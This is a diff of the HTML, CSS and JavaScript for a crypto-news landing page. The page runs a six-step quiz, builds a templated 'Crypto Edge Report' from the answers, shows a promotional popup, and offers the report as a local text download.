+  .field input[type=email]:focus{ outline:none; border-color:var(--accent); }
+  .field-note{ font-size:12px; color:var(--muted); }
+
+  /* ---------- REPORT OUTPUT ---------- */
+  #report{ display:none; }
+  #report.visible{ display:block; }
+  .report-doc{
+    border:1px solid var(--border); border-radius:20px; background:var(--white); box-shadow:var(--shadow);
+    max-width:820px; margin:0 auto; overflow:hidden;
+  }
+  .report-banner{ background:var(--ink); color:#fff; padding:28px 32px; }
+  .report-banner .tag{ background:rgba(255,153,0,0.15); border-color:rgba(255,153,0,0.35); color:#FFC266; margin-bottom:12px;}
+  .report-banner h3{ margin:0 0 6px; font-size:24px; letter-spacing:-0.01em;}
+  .report-banner p{ margin:0; color:#B9BEC9; font-size:14px;}
+  .report-section{ padding:26px 32px; border-top:1px solid var(--border);}
+  .report-section h4{ display:flex; align-items:center; gap:8px; margin:0 0 10px; font-size:15px; letter-spacing:0.01em; }
+  .report-section h4 .chip{
+    font-family:'IBM Plex Mono',monospace; font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:0.06em;
+    background:var(--accent-tint); color:var(--accent-dark); border:1px solid #FFE3B0; padding:3px 8px; border-radius:6px;
+  }
+  .report-section p, .report-section li{ font-size:14.5px; color:var(--ink-soft); margin:0 0 8px; }
+  .report-section ul{ margin:0; padding-left:18px; }
+  .report-actions{ padding:24px 32px 32px; display:flex; flex-wrap:wrap; gap:12px; }
+  .disclaimer{ font-size:12px; color:var(--muted); padding:16px 32px 28px; border-top:1px solid var(--border); }
+
+  footer{ border-top:1px solid var(--border); padding:36px 0; }
+  .foot-row{ display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between; gap:16px; font-size:13px; color:var(--muted);}
+
+  /* ---------- POPUP ---------- */
+  .overlay{
+    position:fixed; inset:0; background:rgba(15,16,20,0.55);
+    display:flex; align-items:center; justify-content:center; padding:20px;
+    z-index:100; opacity:0; pointer-events:none; transition:opacity .25s ease;
+  }
+  .overlay.show{ opacity:1; pointer-events:auto; }
+  .popup{
+    background:#fff; max-width:440px; width:100%; border-radius:20px;
+    padding:30px 30px 26px; position:relative; box-shadow:0 24px 60px rgba(0,0,0,0.25);
+    transform:translateY(14px) scale(0.98); transition:transform .25s ease;
+  }
+  .overlay.show .popup{ transform:translateY(0) scale(1); }
+  .popup-close{
+    position:absolute; top:14px; right:14px; width:30px; height:30px; border-radius:8px;
+    border:1px solid var(--border); background:#fff; cursor:pointer; color:var(--muted); font-size:16px; line-height:1;
+  }
+  .popup-close:hover{ background:var(--surface); color:var(--ink); }
+  .popup .tag{ margin-bottom:14px; }
+  .popup h3{ font-size:23px; line-height:1.2; margin:0 0 10px; letter-spacing:-0.01em;}
+  .popup p{ font-size:14.5px; color:var(--ink-soft); margin:0 0 18px;}
+  .popup ul{ margin:0 0 20px; padding-left:0; list-style:none; display:grid; gap:8px;}
+  .popup ul li{ font-size:13.5px; color:var(--ink-soft); display:flex; gap:8px; align-items:flex-start;}
+  .popup ul li:before{ content:"→"; color:var(--accent-dark); font-weight:700; flex:none; }
+  .popup-foot{ margin-top:14px; text-align:center; }
+  .popup-foot button{ background:none; border:none; color:var(--muted); font-size:13px; cursor:pointer; text-decoration:underline; }
+  .urgency-strip{ display:flex; align-items:center; gap:8px; font-size:12px; color:#B85B00; font-weight:600; margin-bottom:14px;}
+  .urgency-strip .pulse{ width:8px;height:8px;border-radius:50%; background:var(--accent); animation:pulse 1.4s infinite;}
+  @keyframes pulse{ 0%{box-shadow:0 0 0 0 rgba(255,153,0,0.5);} 70%{box-shadow:0 0 0 8px rgba(255,153,0,0);} 100%{box-shadow:0 0 0 0 rgba(255,153,0,0);} }
+
+  ::selection{ background:var(--accent-tint); color:var(--ink); }
+  .visually-hidden{ position:absolute; width:1px;height:1px; overflow:hidden; clip:rect(0 0 0 0); }
+</style>
 </head>
+<body>
 
-<body><!-- ============ NAV ============ -->
-    <header class="site">
-        <div class="nav">
-            <div class="logo"><span class="logo-mark">CQ</span> CryptoQuant</div>
-            <nav class="nav-links"> <a href="#news">News</a> <a href="#analysis">Analysis</a> <a
-                    href="#guides">Guides</a> </nav> <a href="#quiz" class="btn btn-primary btn-sm nav-cta">Get My Free
-                Report</a>
-        </div>
-    </header><!-- ============ HERO ============ -->
-    <section class="hero">
-        <div class="wrap hero-grid">
-            <div> <span class="tag"><span class="dot"></span>Free personalized report</span>
-                <h1>Your Crypto Edge Report, <span>built from your answers.</span></h1>
-                <p class="lede">Answer five short questions about your portfolio, risk tolerance, and trading style.
-                    CryptoQuant matches your profile against today's news and technical analysis to build a report made
-                    for how you actually trade — not a generic market recap.</p>
-                <div class="hero-cta-row"> <a href="#quiz" class="btn btn-primary">Get My Free Report →</a> <a
-                        href="#included" class="btn btn-ghost">See what's inside</a> </div>
-                <div class="hero-meta"> <span>⏱ <b>60 seconds</b> to complete</span> <span>📄 <b>Instant</b>
-                        download</span> <span>🔒 <b>Free</b>, no card required</span> </div>
-            </div>
-            <div class="report-preview" aria-hidden="true">
-                <div class="rp-head"> <strong>Crypto Edge Report — preview</strong> <span class="rp-status"><span
-                            class="live-dot"></span>LIVE COVERAGE</span> </div>
-                <div class="rp-line"><span class="lbl">BTC · trend structure</span><span class="val up">Higher lows
-                        ▲</span></div>
-                <div class="rp-line"><span class="lbl">ETH · momentum</span><span class="val down">Cooling ▼</span>
-                </div>
-                <div class="rp-line"><span class="lbl">SOL · volatility</span><span class="val up">Elevated ▲</span>
-                </div>
-                <div class="rp-line"><span class="lbl">Portfolio match</span><span class="val">Aggressive /
-                        short-term</span></div>
-                <div class="rp-flag">⚠ Risk flag: your stated risk tolerance is more conservative than your current
-                    allocation suggests.</div>
-            </div>
-        </div>
-    </section><!-- ============ TICKER ============ -->
-    <div class="ticker-band" aria-hidden="true">
-        <div class="ticker-track"> <span class="ticker-item"><span class="sym">BTC</span> Momentum builds as key
-                resistance is retested <span class="chg up">▲</span></span> <span class="ticker-item"><span
-                    class="sym">ETH</span> Network activity ticks up ahead of upgrade window <span
-                    class="chg up">▲</span></span> <span class="ticker-item"><span class="sym">SOL</span> Volatility
-                widens on derivatives positioning <span class="chg down">▼</span></span> <span class="ticker-item"><span
-                    class="sym">MACRO</span> Rate expectations shift risk appetite across assets <span
-                    class="chg up">▲</span></span> <span class="ticker-item"><span class="sym">XRP</span> Range-bound
-                trading persists into the week <span class="chg down">▼</span></span> <span class="ticker-item"><span
-                    class="sym">ALTS</span> Rotation narrative gains traction on the desk <span
-                    class="chg up">▲</span></span> <!-- duplicate for seamless loop --> <span class="ticker-item"><span
-                    class="sym">BTC</span> Momentum builds as key resistance is retested <span
-                    class="chg up">▲</span></span> <span class="ticker-item"><span class="sym">ETH</span> Network
-                activity ticks up ahead of upgrade window <span class="chg up">▲</span></span> <span
-                class="ticker-item"><span class="sym">SOL</span> Volatility widens on derivatives positioning <span
-                    class="chg down">▼</span></span> <span class="ticker-item"><span class="sym">MACRO</span> Rate
-                expectations shift risk appetite across assets <span class="chg up">▲</span></span> <span
-                class="ticker-item"><span class="sym">XRP</span> Range-bound trading persists into the week <span
-                    class="chg down">▼</span></span> <span class="ticker-item"><span class="sym">ALTS</span> Rotation
-                narrative gains traction on the desk <span class="chg up">▲</span></span> </div>
-    </div><!-- ============ WHAT'S INCLUDED ============ -->
-    <section id="included">
-        <div class="wrap">
-            <div class="section-head"> <span class="tag">What's inside</span>
-                <h2>A briefing built around your answers, not a generic newsletter.</h2>
-                <p>Every report combines your quiz answers with CryptoQuant's live news desk and technical analysis
-                    team. Here's exactly what you'll get.</p>
-            </div>
-            <div class="card-grid cols-4">
-                <div class="card">
-                    <div class="num">01</div>
-                    <h3>Chart-based observations</h3>
-                    <p>A plain-English technical read on the assets you follow — trend structure, key levels, and
-                        momentum, without the jargon.</p>
-                </div>
-                <div class="card">
-                    <div class="num">02</div>
-                    <h3>Risk flags</h3>
-                    <p>Where your stated risk tolerance and your current approach might be out of step — flagged
-                        clearly, before the market flags it for you.</p>
-                </div>
-                <div class="card">
-                    <div class="num">03</div>
-                    <h3>Watchlist ideas</h3>
-                    <p>A short, relevant list of assets worth watching, matched to your time horizon and trading style
-                        from CryptoQuant's active coverage.</p>
-                </div>
-                <div class="card">
-                    <div class="num">04</div>
-                    <h3>Next steps</h3>
-                    <p>Practical, beginner-friendly actions for this week — grounded in what you told us, not
-                        one-size-fits-all advice.</p>
-                </div>
-            </div>
-        </div>
-    </section><!-- ============ HOW IT WORKS ============ -->
-    <section class="alt">
-        <div class="wrap">
-            <div class="section-head"> <span class="tag">How it works</span>
-                <h2>Three steps. About a minute. One report built around you.</h2>
-            </div>
-            <div class="steps">
-                <div class="step">
-                    <div class="step-num">STEP 01</div>
-                    <h4>Take the 60-second quiz</h4>
-                    <p>Tell us about your portfolio, time horizon, risk tolerance, favorite assets, and trading style.
-                    </p>
-                </div>
-                <div class="step">
-                    <div class="step-num">STEP 02</div>
-                    <h4>We match it to our coverage</h4>
-                    <p>Your answers are cross-referenced against CryptoQuant's live news and technical analysis.</p>
-                </div>
-                <div class="step">
-                    <div class="step-num">STEP 03</div>
-                    <h4>Get your report instantly</h4>
-                    <p>Read it in five minutes, or download it to come back to before you make your next move.</p>
-                </div>
-            </div>
-        </div>
-    </section><!-- ============ QUIZ ============ -->
-    <section id="quiz">
-        <div class="wrap">
-            <div class="section-head" style="margin-left:auto;margin-right:auto;text-align:center;"> <span class="tag"
-                    style="margin-left:auto;margin-right:auto;display:inline-flex;">60-second quiz</span>
-                <h2>Build your Crypto Edge Report</h2>
-                <p style="margin-left:auto;margin-right:auto;">Five quick questions. Your report is generated instantly
-                    on the next screen.</p>
-            </div>
-            <form id="quizForm" class="quiz-shell" novalidate>
-                <div class="quiz-top">
-                    <div class="progress-row"> <span id="stepLabel" class="mono">STEP 1 / 6</span> <span id="stepPct"
-                            class="mono">17%</span> </div>
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
-                    </div>
-                </div>
-                <div class="quiz-body"> <!-- Step 1: portfolio size -->
-                    <div class="q-step active" data-step="1">
-                        <h3>What's the size of your current crypto portfolio?</h3>
-                        <p class="q-sub">This helps us calibrate risk flags to your actual exposure.</p>
-                        <div class="opt-grid" data-field="portfolio">
-                            <div class="opt" data-value="Under $1,000">Under $1,000 <span class="check">✓</span></div>
-                            <div class="opt" data-value="$1,000–$10,000">$1,000 – $10,000 <span class="check">✓</span>
-                            </div>
-                            <div class="opt" data-value="$10,000–$100,000">$10,000 – $100,000 <span
-                                    class="check">✓</span></div>
-                            <div class="opt" data-value="$100,000+">$100,000+ <span class="check">✓</span></div>
-                        </div>
-                    </div> <!-- Step 2: time horizon -->
-                    <div class="q-step" data-step="2">
-                        <h3>What's your time horizon?</h3>
-                        <p class="q-sub">This shapes whether your report focuses on today's chart or the bigger
-                            structural picture.</p>
-                        <div class="opt-grid" data-field="horizon">
-                            <div class="opt" data-value="Day trades">Day trades <span class="check">✓</span></div>
-                            <div class="opt" data-value="Weeks to months">Weeks to months <span class="check">✓</span>
-                            </div>
-                            <div class="opt" data-value="1+ years">1+ years <span class="check">✓</span></div>
-                            <div class="opt" data-value="Long-term hold">Long-term hold, mostly hands-off <span
-                                    class="check">✓</span></div>
-                        </div>
-                    </div> <!-- Step 3: risk tolerance -->
-                    <div class="q-step" data-step="3">
-                        <h3>How would you describe your risk tolerance?</h3>
-                        <p class="q-sub">Be honest here — this is what your risk flags get measured against.</p>
-                        <div class="opt-grid" data-field="risk">
-                            <div class="opt" data-value="Conservative">Conservative — protect capital first <span
-                                    class="check">✓</span></div>
-                            <div class="opt" data-value="Balanced">Balanced — some risk for growth <span
-                                    class="check">✓</span></div>
-                            <div class="opt" data-value="Aggressive">Aggressive — comfortable with volatility <span
-                                    class="check">✓</span></div>
-                        </div>
-                    </div> <!-- Step 4: favorite assets -->
-                    <div class="q-step" data-step="4">
-                        <h3>Which assets do you follow most closely?</h3>
-                        <p class="q-sub">Select all that apply. Your watchlist ideas are built around these.</p>
-                        <div class="opt-grid" data-field="assets" data-multi="true">
-                            <div class="opt" data-value="Bitcoin (BTC)">Bitcoin (BTC) <span class="check">✓</span></div>
-                            <div class="opt" data-value="Ethereum (ETH)">Ethereum (ETH) <span class="check">✓</span>
-                            </div>
-                            <div class="opt" data-value="Solana (SOL)">Solana (SOL) <span class="check">✓</span></div>
-                            <div class="opt" data-value="XRP">XRP <span class="check">✓</span></div>
-                            <div class="opt" data-value="Stablecoins">Stablecoins <span class="check">✓</span></div>
-                            <div class="opt" data-value="Altcoins / other">Altcoins / other <span class="check">✓</span>
-                            </div>
-                        </div>
-                    </div> <!-- Step 5: trading style -->
-                    <div class="q-step" data-step="5">
-                        <h3>What's your trading style?</h3>
-                        <p class="q-sub">This determines the tone and focus of your "next steps" section.</p>
-                        <div class="opt-grid" data-field="style">
-                            <div class="opt" data-value="Buy and hold">Buy and hold <span class="check">✓</span></div>
-                            <div class="opt" data-value="Swing trading">Swing trading <span class="check">✓</span></div>
-                            <div class="opt" data-value="Active / day trading">Active / day trading <span
-                                    class="check">✓</span></div>
-                            <div class="opt" data-value="Just researching">Just researching for now <span
-                                    class="check">✓</span></div>
-                        </div>
-                    </div> <!-- Step 6: email -->
-                    <div class="q-step" data-step="6">
-                        <h3>Where should we send your report?</h3>
-                        <p class="q-sub">Your report unlocks instantly on this page — we'll also send a copy to your
-                            inbox.</p>
-                        <div class="field"> <label for="email">Email address</label> <input type="email" id="email"
-                                placeholder="you@example.com" required autocomplete="email">
-                            <div class="field-note">No spam. Unsubscribe anytime.</div>
-                        </div>
-                    </div>
-                </div>
-                <div class="quiz-body" style="padding-top:0;">
-                    <div class="q-nav"> <button type="button" class="back-link" id="backBtn" disabled>← Back</button>
-                        <button type="button" class="btn btn-primary" id="nextBtn" disabled>Continue</button> </div>
-                </div>
-            </form>
-        </div>
-    </section><!-- ============ REPORT OUTPUT ============ -->
-    <section id="report" class="alt">
-        <div class="wrap">
-            <div class="report-doc">
-                <div class="report-banner"> <span class="tag">Your report is ready</span>
-                    <h3 id="reportTitle">My CryptoQuant Crypto Edge Report</h3>
-                    <p id="reportSubtitle">Built from your answers and matched against today's CryptoQuant coverage.</p>
-                </div>
-                <div class="report-section">
-                    <h4><span class="chip">Profile match</span></h4>
-                    <p id="rProfile">—</p>
-                </div>
-                <div class="report-section">
-                    <h4><span class="chip">Market pulse</span> Chart-based observations</h4>
-                    <ul id="rPulse"></ul>
-                </div>
-                <div class="report-section">
-                    <h4><span class="chip">Risk flag</span></h4>
-                    <p id="rRisk">—</p>
-                </div>
-                <div class="report-section">
-                    <h4><span class="chip">Watchlist</span></h4>
-                    <ul id="rWatchlist"></ul>
-                </div>
-                <div class="report-section">
-                    <h4><span class="chip">Next steps</span></h4>
-                    <ul id="rNext"></ul>
-                </div>
-                <div class="report-actions"> <button type="button" class="btn btn-primary" id="downloadBtn">⬇ Download
-                        my report</button> <button type="button" class="btn btn-ghost" id="retakeBtn">Retake the
-                        quiz</button> </div>
-                <div class="disclaimer"> This report is generated for educational purposes from your quiz answers and
-                    CryptoQuant's published market coverage. It is not financial advice and should not be treated as a
-                    recommendation to buy, sell, or hold any asset. Cryptocurrency markets are volatile — always do your
-                    own research before making decisions. </div>
-            </div>
-        </div>
-    </section>
-    <footer>
-        <div class="wrap foot-row">
-            <div>© 2026 CryptoQuant. Real-time crypto news, technical analysis, and beginner-friendly guides.</div>
-            <div>Educational content only — not financial advice.</div>
-        </div>
-    </footer><!-- ============ POPUP ============ -->
-    <div class="overlay" id="popupOverlay" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
-        <div class="popup"> <button class="popup-close" id="popupClose" aria-label="Close">✕</button> <span
-                class="urgency-strip"><span class="pulse"></span>OPEN NOW — FREE ACCESS</span> <span class="tag"><span
-                    class="dot"></span>Personalized · Free</span>
-            <h3 id="popupTitle">Your Crypto Edge Report is waiting to be built.</h3>
-            <p>The market doesn't wait for anyone. In 60 seconds, CryptoQuant will turn your answers into a personalized
-                report — before you make your next move without one.</p>
-            <ul>
-                <li>Chart-based observations on the assets you actually hold</li>
-                <li>Risk flags matched to your real risk tolerance</li>
-                <li>A watchlist and next steps built for your trading style</li>
-            </ul> <a href="#quiz" class="btn btn-primary btn-block" id="popupCta">Unlock My Crypto Edge</a>
-            <div class="popup-foot"><button type="button" id="popupDismiss">Not right now</button></div>
-        </div>
+<!-- ============ NAV ============ -->
+<header class="site">
+  <div class="nav">
+    <div class="logo"><span class="logo-mark">CQ</span> CryptoQuant</div>
+    <nav class="nav-links">
+      <a href="#news">News</a>
+      <a href="#analysis">Analysis</a>
+      <a href="#guides">Guides</a>
+    </nav>
+    <a href="#quiz" class="btn btn-primary btn-sm nav-cta">Get My Free Report</a>
+  </div>
+</header>
+
+<!-- ============ HERO ============ -->
+<section class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="tag"><span class="dot"></span>Free personalized report</span>
+      <h1>Your Crypto Edge Report, <span>built from your answers.</span></h1>
+      <p class="lede">Answer five short questions about your portfolio, risk tolerance, and trading style. CryptoQuant matches your profile against today's news and technical analysis to build a report made for how you actually trade — not a generic market recap.</p>
+      <div class="hero-cta-row">
+        <a href="#quiz" class="btn btn-primary">Get My Free Report →</a>
+        <a href="#included" class="btn btn-ghost">See what's inside</a>
+      </div>
+      <div class="hero-meta">
+        <span>⏱ <b>60 seconds</b> to complete</span>
+        <span>📄 <b>Instant</b> download</span>
+        <span>🔒 <b>Free</b>, no card required</span>
+      </div>
     </div>
-    <script>(function () { "use strict";  /* ---------------- POPUP ---------------- */  var overlay = document.getElementById('popupOverlay'); var STORAGE_KEY = 'cq_popup_dismissed'; function showPopup() { if (sessionStorage.getItem(STORAGE_KEY)) return; overlay.classList.add('show'); } function hidePopup(remember) { overlay.classList.remove('show'); if (remember) sessionStorage.setItem(STORAGE_KEY, '1'); } setTimeout(showPopup, 4000); document.addEventListener('mouseout', function (e) { if (!e.relatedTarget && e.clientY < 10) showPopup(); }); document.getElementById('popupClose').addEventListener('click', function () { hidePopup(true); }); document.getElementById('popupDismiss').addEventListener('click', function () { hidePopup(true); }); document.getElementById('popupCta').addEventListener('click', function () { hidePopup(true); }); overlay.addEventListener('click', function (e) { if (e.target === overlay) hidePopup(true); }); document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && overlay.classList.contains('show')) hidePopup(true); });  /* ---------------- QUIZ ---------------- */  var totalSteps = 6; var currentStep = 1; var answers = { portfolio: null, horizon: null, risk: null, assets: [], style: null, email: null }; var stepLabel = document.getElementById('stepLabel'); var stepPct = document.getElementById('stepPct'); var progressFill = document.getElementById('progressFill'); var backBtn = document.getElementById('backBtn'); var nextBtn = document.getElementById('nextBtn'); var emailInput = document.getElementById('email'); function updateProgress() { var pct = Math.round((currentStep / totalSteps) * 100); stepLabel.textContent = 'STEP ' + currentStep + ' / ' + totalSteps; stepPct.textContent = pct + '%'; progressFill.style.width = pct + '%'; backBtn.disabled = currentStep === 1; } function stepIsValid(step) { if (step === 4) return answers.assets.length > 0; if (step === 6) return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim()); var map = { 1: 'portfolio', 2: 'horizon', 3: 'risk', 5: 'style' }; return !!answers[map[step]]; } function refreshNextState() { nextBtn.disabled = !stepIsValid(currentStep); nextBtn.textContent = currentStep === totalSteps ? 'Get My Free Report' : 'Continue'; } function goToStep(n) { document.querySelectorAll('.q-step').forEach(function (el) { el.classList.toggle('active', parseInt(el.dataset.step, 10) === n); }); currentStep = n; updateProgress(); refreshNextState(); } document.querySelectorAll('.opt-grid').forEach(function (grid) { var field = grid.dataset.field; var multi = grid.dataset.multi === 'true'; grid.querySelectorAll('.opt').forEach(function (opt) { opt.addEventListener('click', function () { var value = opt.dataset.value; if (multi) { opt.classList.toggle('selected'); var idx = answers.assets.indexOf(value); if (opt.classList.contains('selected') && idx === -1) answers.assets.push(value); if (!opt.classList.contains('selected') && idx !== -1) answers.assets.splice(idx, 1); } else { grid.querySelectorAll('.opt').forEach(function (o) { o.classList.remove('selected'); }); opt.classList.add('selected'); answers[field] = value; } refreshNextState(); }); }); }); emailInput.addEventListener('input', refreshNextState); backBtn.addEventListener('click', function () { if (currentStep > 1) goToStep(currentStep - 1); }); nextBtn.addEventListener('click', function () { if (!stepIsValid(currentStep)) return; if (currentStep < totalSteps) { goToStep(currentStep + 1); } else { answers.email = emailInput.value.trim(); generateReport(); } }); updateProgress(); refreshNextState();  /* ---------------- REPORT GENERATION ---------------- */  function generateReport() { var reportSection = document.getElementById('report'); var quizSection = document.getElementById('quiz'); document.getElementById('rProfile').textContent = 'Portfolio size: ' + answers.portfolio + '. Time horizon: ' + answers.horizon.toLowerCase() + '. Risk tolerance: ' + answers.risk.toLowerCase() + '. Trading style: ' + answers.style.toLowerCase() + '.';    // Market pulse — chart-based observations tied to selected assets    var pulseCopy = {      'Bitcoin (BTC)':'BTC is holding a pattern of higher lows on the daily chart, with buyers stepping in on pullbacks toward recent support.',      'Ethereum (ETH)':'ETH momentum has cooled from recent highs; watch whether it holds above its nearest support band or slips into a wider range.',      'Solana (SOL)':'SOL is showing wider daily swings than usual — a sign of active positioning rather than a clear trend in either direction.',      'XRP':'XRP remains range-bound, trading between well-established support and resistance with no clear breakout yet.',      'Stablecoins':'Stablecoin flows are a useful gauge of risk appetite right now — rising balances on exchanges often precede broader market moves.',      'Altcoins / other':'Smaller-cap assets are seeing pockets of rotation as capital moves in and out of higher-beta names.'    };    var pulseList = document.getElementById('rPulse');    pulseList.innerHTML = '';    var chosenAssets = answers.assets.length ? answers.assets : ['Bitcoin (BTC)'];    chosenAssets.forEach(function(a){      var li = document.createElement('li');      li.textContent = pulseCopy[a] || ('Coverage on ' + a + ' is being tracked and will be reflected in your next update.');      pulseList.appendChild(li);    });    // Risk flag — compares risk tolerance to portfolio size / horizon    var riskMsg;    if (answers.risk === 'Conservative' && (answers.horizon === 'Day trades' || answers.style === 'Active / day trading')){      riskMsg = 'You describe yourself as conservative, but your trading style leans toward short-term, active trading. That combination tends to produce faster, harder-to-predict swings in a portfolio than a conservative investor typically wants. Worth revisiting position sizing before your next trade.';    } else if (answers.risk === 'Aggressive' && answers.portfolio === 'Under $1,000'){      riskMsg = 'An aggressive risk stance is reasonable at smaller portfolio sizes, since the absolute dollar exposure is limited. Just be mindful that percentage swings will still feel large relative to your account.';    } else if (answers.risk === 'Aggressive' && (answers.portfolio === '$100,000+' || answers.portfolio === '$10,000–$100,000')){      riskMsg = 'At this portfolio size, an aggressive stance means real drawdowns can be substantial in dollar terms. Consider whether your current allocation reflects the risk you actually want to carry, not just the risk you\'re comfortable stating.';    } else if (answers.style === 'Buy and hold' && answers.horizon === 'Day trades'){      riskMsg = 'You selected buy-and-hold as your style but a day-trading time horizon — these two often pull in different directions. Clarifying which one drives your decisions can reduce reactive moves.';    } else {      riskMsg = 'Your stated risk tolerance and trading approach are broadly aligned right now. The main flag is a general one: volatility in this market remains elevated, so position sizing matters more than usual.';    }    document.getElementById('rRisk').textContent = riskMsg;    // Watchlist ideas    var watchlistList = document.getElementById('rWatchlist');    watchlistList.innerHTML = '';    var watchlistCopy = {      'Day trades':'Short-term setups on liquid majors (BTC, ETH) where intraday ranges are well-defined.',      'Weeks to months':'Assets showing multi-week trend structure rather than single-day noise — useful for swing-style entries.',      '1+ years':'Larger-cap assets with established track records, evaluated on longer moving averages rather than daily price action.',      'Long-term hold':'Core holdings suited to periodic review rather than daily monitoring — focus on structural, not short-term, signals.'    };    var li1 = document.createElement('li');    li1.textContent = watchlistCopy[answers.horizon] || 'A mix of majors and select alternative assets matched to your stated horizon.';    watchlistList.appendChild(li1);    chosenAssets.slice(0,3).forEach(function(a){      var li = document.createElement('li');      li.textContent = a + ' — flagged for continued coverage given your interest in it.';      watchlistList.appendChild(li);    });    // Next steps    var nextList = document.getElementById('rNext');    nextList.innerHTML = '';    var nextCopy = {      'Buy and hold':['Review your allocation against your stated risk tolerance rather than recent price moves.','Set a calendar reminder to revisit your portfolio quarterly instead of checking daily.'],      'Swing trading':['Define your invalidation level before entering a position, not after.','Track the assets on your watchlist for multi-day trend confirmation before acting.'],      'Active / day trading':['Pre-define position size and stop level for every trade before the market opens.','Keep a simple log of entries and exits — patterns are easier to spot in writing than in memory.'],      'Just researching':['Start with CryptoQuant\'s beginner guides on reading charts before committing capital.','Paper-trade your ideas for a few weeks to build a feel for volatility without risk.']    };    (nextCopy[answers.style] || ['Revisit your risk tolerance answer against your current holdings this week.']).forEach(function(step){      var li = document.createElement('li');      li.textContent = step;      nextList.appendChild(li);    });    var li2 = document.createElement('li');    li2.textContent = 'Bookmark CryptoQuant\'s live coverage to track how these observations develop over the next few sessions.';    nextList.appendChild(li2);    quizSection.style.display = 'none';    reportSection.classList.add('visible');    reportSection.scrollIntoView({behavior:'smooth', block:'start'});  }  document.getElementById('retakeBtn').addEventListener('click', function(){    document.getElementById('report').classList.remove('visible');    document.getElementById('quiz').style.display = '';    answers = { portfolio:null, horizon:null, risk:null, assets:[], style:null, email:null };    document.querySelectorAll('.opt.selected').forEach(function(o){ o.classList.remove('selected'); });    emailInput.value = '';    goToStep(1);    document.getElementById('quiz').scrollIntoView({behavior:'smooth', block:'start'});  });  document.getElementById('downloadBtn').addEventListener('click', function(){    var lines = [];    lines.push('MY CRYPTOQUANT CRYPTO EDGE REPORT');    lines.push('Built ' + new Date().toLocaleDateString());    lines.push('');    lines.push('PROFILE MATCH');    lines.push(document.getElementById('rProfile').textContent);    lines.push('');    lines.push('MARKET PULSE — CHART-BASED OBSERVATIONS');    document.querySelectorAll('#rPulse li').forEach(function(li){ lines.push('- ' + li.textContent); });    lines.push('');    lines.push('RISK FLAG');    lines.push(document.getElementById('rRisk').textContent);    lines.push('');    lines.push('WATCHLIST');    document.querySelectorAll('#rWatchlist li').forEach(function(li){ lines.push('- ' + li.textContent); });    lines.push('');    lines.push('NEXT STEPS');    document.querySelectorAll('#rNext li').forEach(function(li){ lines.push('- ' + li.textContent); });    lines.push('');    lines.push('This report is for educational purposes only and is not financial advice.');    var blob = new Blob([lines.join('\n')], {type:'text/plain'});    var url = URL.createObjectURL(blob);    var a = document.createElement('a');    a.href = url;    a.download = 'cryptoquant-crypto-edge-report.txt';    document.body.appendChild(a);    a.click();    document.body.removeChild(a);    URL.revokeObjectURL(url);  });})();</script>
+    <div class="report-preview" aria-hidden="true">
+      <div class="rp-head">
+        <strong>Crypto Edge Report — preview</strong>
+        <span class="rp-status"><span class="live-dot"></span>LIVE COVERAGE</span>
+      </div>
+      <div class="rp-line"><span class="lbl">BTC · trend structure</span><span class="val up">Higher lows ▲</span></div>
+      <div class="rp-line"><span class="lbl">ETH · momentum</span><span class="val down">Cooling ▼</span></div>
+      <div class="rp-line"><span class="lbl">SOL · volatility</span><span class="val up">Elevated ▲</span></div>
+      <div class="rp-line"><span class="lbl">Portfolio match</span><span class="val">Aggressive / short-term</span></div>
+      <div class="rp-flag">⚠ Risk flag: your stated risk tolerance is more conservative than your current allocation suggests.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TICKER ============ -->
+<div class="ticker-band" aria-hidden="true">
+  <div class="ticker-track">
+    <span class="ticker-item"><span class="sym">BTC</span> Momentum builds as key resistance is retested <span class="chg up">▲</span></span>
+    <span class="ticker-item"><span class="sym">ETH</span> Network activity ticks up ahead of upgrade window <span class="chg up">▲</span></span>
+    <span class="ticker-item"><span class="sym">SOL</span> Volatility widens on derivatives positioning <span class="chg down">▼</span></span>
+    <span class="ticker-item"><span class="sym">MACRO</span> Rate expectations shift risk appetite across assets <span class="chg up">▲</span></span>
+    <span class="ticker-item"><span class="sym">XRP</span> Range-bound trading persists into the week <span class="chg down">▼</span></span>
+    <span class="ticker-item"><span class="sym">ALTS</span> Rotation narrative gains traction on the desk <span class="chg up">▲</span></span>
+    <!-- duplicate for seamless loop -->
+    <span class="ticker-item"><span class="sym">BTC</span> Momentum builds as key resistance is retested <span class="chg up">▲</span></span>
+    <span class="ticker-item"><span class="sym">ETH</span> Network activity ticks up ahead of upgrade window <span class="chg up">▲</span></span>
+    <span class="ticker-item"><span class="sym">SOL</span> Volatility widens on derivatives positioning <span class="chg down">▼</span></span>
+    <span class="ticker-item"><span class="sym">MACRO</span> Rate expectations shift risk appetite across assets <span class="chg up">▲</span></span>
+    <span class="ticker-item"><span class="sym">XRP</span> Range-bound trading persists into the week <span class="chg down">▼</span></span>
+    <span class="ticker-item"><span class="sym">ALTS</span> Rotation narrative gains traction on the desk <span class="chg up">▲</span></span>
+  </div>
+</div>
+
+<!-- ============ WHAT'S INCLUDED ============ -->
+<section id="included">
+  <div class="wrap">
+    <div class="section-head">
+      <span class="tag">What's inside</span>
+      <h2>A briefing built around your answers, not a generic newsletter.</h2>
+      <p>Every report combines your quiz answers with CryptoQuant's live news desk and technical analysis team. Here's exactly what you'll get.</p>
+    </div>
+    <div class="card-grid cols-4">
+      <div class="card">
+        <div class="num">01</div>
+        <h3>Chart-based observations</h3>
+        <p>A plain-English technical read on the assets you follow — trend structure, key levels, and momentum, without the jargon.</p>
+      </div>
+      <div class="card">
+        <div class="num">02</div>
+        <h3>Risk flags</h3>
+        <p>Where your stated risk tolerance and your current approach might be out of step — flagged clearly, before the market flags it for you.</p>
+      </div>
+      <div class="card">
+        <div class="num">03</div>
+        <h3>Watchlist ideas</h3>
+        <p>A short, relevant list of assets worth watching, matched to your time horizon and trading style from CryptoQuant's active coverage.</p>
+      </div>
+      <div class="card">
+        <div class="num">04</div>
+        <h3>Next steps</h3>
+        <p>Practical, beginner-friendly actions for this week — grounded in what you told us, not one-size-fits-all advice.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ HOW IT WORKS ============ -->
+<section class="alt">
